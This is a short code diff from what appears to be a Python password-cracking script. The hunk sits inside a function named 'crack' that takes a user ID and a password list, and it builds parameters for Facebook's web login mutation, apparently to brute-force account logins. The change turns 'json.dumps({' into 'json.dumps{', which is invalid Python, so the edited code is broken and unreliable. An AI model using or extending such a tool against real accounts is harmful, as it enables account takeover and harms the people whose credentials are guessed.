@@ -179,7 +179,7 @@ def crack(uid, password_list, total_count):
     'fb_api_caller_class': 'RelayModern',
     'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
     'server_timestamps': 'true',
-    'variables': json.dumps({
+    'variables': json.dumps{
         "input": {
             "actor_id": "0",
             "client_mutation_id": "2",
